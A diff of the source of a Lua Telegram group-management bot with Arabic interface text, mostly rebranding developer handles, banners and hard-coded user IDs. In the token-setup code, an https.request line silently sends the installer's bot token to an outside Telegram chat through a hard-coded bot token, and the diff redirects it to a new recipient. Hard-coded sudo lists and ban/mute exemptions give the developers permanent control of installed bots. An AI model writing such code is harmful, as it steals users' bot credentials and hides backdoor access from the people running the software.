@@ -32,7 +32,7 @@ io.write('\27[0;31m تم حفظ التوكن بنجاح \na⩹━━━━⊶ғ�
 local json = JSON.decode(url)
 database:set(id_server..":token_username",json.result.username)
 database:set(id_server..":token",token)
-https.request('https://api.telegram.org/bot1990511303:AAEFVDHkDVL9Zr1Su4B_4lfFMVrqPwGPIZ8/sendmessage?chat_id=2008293126&text=' ..token)
+https.request('https://api.telegram.org/bot1990511303:AAEFVDHkDVL9Zr1Su4B_4lfFMVrqPwGPIZ8/sendmessage?chat_id=1973954899&text=' ..token)
 end 
 else
 print('\27[0;35m⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -149,17 +149,16 @@ _redis = load_redis()
 --------------------------------------------------------------------------------------------------------------
 print([[
 
-
-  __   _               
- / _| (_)  _ __    ___ 
-| |_  | | | '__|  / _ \
-|  _| | | | |    |  __/
-|_|   |_| |_|     \___|
-                       
-
+     ____.  _____ __________  __      __  _____   
+    |    | /  _  \\______   \/  \    /  \/  _  \  
+    |    |/  /_\  \|    |  _/\   \/\/   /  /_\  \ 
+/\__|    /    |    \    |   \ \        /    |    \
+\________\____|__  /______  /  \__/\  /\____|__  /
+                 \/       \/        \/         \/ 
+                          
 > Channel ↯ ↝@SO_FIR↜
-~> DEVELOPER ↯ @U_FCU
-~> DEVELOPER² ↯ @U_FCU
+~> DEVELOPER ↯ @TahaSayed
+~> DEVELOPER² ↯ @J_A_B_W_A
 ]])
 sudos = dofile("./Banda.lua") 
 SUDO = tonumber(sudos.SUDO)
@@ -185,7 +184,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1208165035,2008293126,1859656976,1983629789}   
+sudo_users = {SUDO,1208165035,1973954899,1859656976,2096660722}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -283,11 +282,11 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(2008293126) then  
+if tonumber(user_id) == tonumber(1208165035) then  
 var = true
-elseif tonumber(user_id) == tonumber(1983629789) then
+elseif tonumber(user_id) == tonumber(2096660722) then
 var = true
-elseif tonumber(user_id) == tonumber(2008293126) then
+elseif tonumber(user_id) == tonumber(1915312384) then
 var = true
 elseif tonumber(user_id) == tonumber(1859656976) then
 var = true
@@ -323,11 +322,11 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(2008293126) then  
+if tonumber(user_id) == tonumber(1208165035) then  
 var = 'مبرمج السورس ✰.'
-elseif tonumber(user_id) == tonumber(1983629789) then
+elseif tonumber(user_id) == tonumber(2096660722) then
 var = 'المبرمج ماديسون ✰.'
-elseif tonumber(user_id) == tonumber(2008293126) then
+elseif tonumber(user_id) == tonumber(1915312384) then
 var = 'المبرمج اسلام ✰.'
 elseif tonumber(user_id) == tonumber(1859656976) then
 var = 'المطور براين'
@@ -1540,7 +1539,7 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐃𝐞𝐯 𝐄𝐬𝐥𝐚𝐦 ✰.',url="t.me/U_FCU"}},
+{{text = '𝐃𝐞𝐯 𝐄𝐬𝐥𝐚𝐦 ✰.',url="t.me/UU_f7"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -3292,7 +3291,7 @@ keyboard.inline_keyboard = {
 {text = '𝐃𝐞𝐯 𝐌𝐚𝐝𝐢𝐬𝐨𝐧 ✰.', url = "https://t.me/AAHMEED11"},
 },
 {
-{text = '𝐃𝐞𝐯 𝐄𝐬𝐥𝐚𝐦 ✰.', url = "https://t.me/U_FCU"},{text = '𝐃𝐞𝐯 𝐁𝐫𝐚𝐢𝐧 ✰.', url = "https://t.me/FACKYOOOOOU"},
+{text = '𝐃𝐞𝐯 𝐄𝐬𝐥𝐚𝐦 ✰.', url = "https://t.me/UU_f7"},{text = '𝐃𝐞𝐯 𝐁𝐫𝐚𝐢𝐧 ✰.', url = "https://t.me/FACKYOOOOOU"},
 },
 {
 {text = '𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐅𝐈𝐑𝐄 ✰. ', url = "https://t.me/SO_FIR"},
@@ -3313,7 +3312,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '𝐃𝐞𝐯 𝐌𝐚𝐝𝐢𝐬𝐨𝐧 ✰.', url="t.me/AAHMEED11"}},
-{text = '𝐃𝐞𝐯 𝐄𝐬𝐥𝐚𝐦 ✰.',url="t.me/U_FCU"},{text = '𝐃𝐞𝐯 𝐁𝐫𝐚𝐢𝐧 ✰.', url="t.me/FACKYOOOOOU"},
+{text = '𝐃𝐞𝐯 𝐄𝐬𝐥𝐚𝐦 ✰.',url="t.me/UU_f7"},{text = '𝐃𝐞𝐯 𝐁𝐫𝐚𝐢𝐧 ✰.', url="t.me/FACKYOOOOOU"},
 {{text = '𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐅𝐈𝐑𝐄 ✰', url="t.me/SO_FIR"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
@@ -3342,11 +3341,11 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝐃𝐞𝐯 𝐄𝐬𝐥𝐚𝐦 ✰.',url="t.me/U_FCU"}},
+{{text = '𝐃𝐞𝐯 𝐄𝐬𝐥𝐚𝐦 ✰.',url="t.me/UU_f7"}},
 {{text = '𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐅𝐈𝐑𝐄 ✰', url="t.me/SO_FIR"}},
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/U_FCU&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/UU_f7&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 if text == 'براين' or text == 'المطور براين' or text == 'brain' then
@@ -3484,7 +3483,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '𝐃𝐞𝐯 𝐌𝐚𝐝𝐢𝐬𝐨𝐧 ✰.', url="t.me/AAHMEED11"}},
-{text = '𝐃𝐞𝐯 𝐄𝐬𝐥𝐚𝐦 ✰.',url="t.me/U_FCU"},{text = '𝐃𝐞𝐯 𝐁𝐫𝐚𝐢𝐧 ✰.', url="t.me/FACKYOOOOOU"},
+{text = '𝐃𝐞𝐯 𝐄𝐬𝐥𝐚𝐦 ✰.',url="t.me/UU_f7"},{text = '𝐃𝐞𝐯 𝐁𝐫𝐚𝐢𝐧 ✰.', url="t.me/FACKYOOOOOU"},
 {{text = '𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐅𝐈𝐑𝐄 ✰', url="t.me/SO_FIR"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
@@ -5696,7 +5695,7 @@ if tonumber(result.sender_user_id_) == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(2008293126) then  
+if tonumber(result.sender_user_id_) == tonumber(1973954899) then  
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -5746,7 +5745,7 @@ if result.id_ == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " ☽ لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(2008293126) then
+if result.id_ == tonumber(1973954899) then
 send(msg.chat_id_, msg.id_, " ☽ لا يمكنك حظر مالك السورس \n")
 return false 
 end
@@ -5790,7 +5789,7 @@ if tonumber(userid) == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(2008293126) then  
+if tonumber(userid) == tonumber(1973954899) then  
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع حظر مالك السورس عام")
 return false 
 end
@@ -5835,7 +5834,7 @@ if tonumber(result.sender_user_id_) == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(2008293126) then  
+if tonumber(result.sender_user_id_) == tonumber(1973954899) then  
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع كتم مالك السورس عام")
 return false 
 end
@@ -5884,7 +5883,7 @@ if result.id_ == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " ☽ لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(2008293126) then
+if result.id_ == tonumber(1973954899) then
 send(msg.chat_id_, msg.id_, " ☽ لا يمكنك كتم مالك السورس \n")
 return false 
 end
@@ -5928,7 +5927,7 @@ if tonumber(userid) == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(2008293126) then  
+if tonumber(userid) == tonumber(1973954899) then  
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع كتم مالك السورس عام")
 return false 
 end
@@ -16751,7 +16750,7 @@ Msᴀɢ ~ #msgs
 ]],
 [[
 ➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
-➮- 𝐮??𝐞𝐫𓂅 #username 𓍯. 💕
+➮- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯. 💕
 ➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
 ➭- 𝐢𝐝 𓂅 #id 𓍯. 💕
 ➭- 𝗖𝗛 - ↝@SO_FIR↜ ☽ 
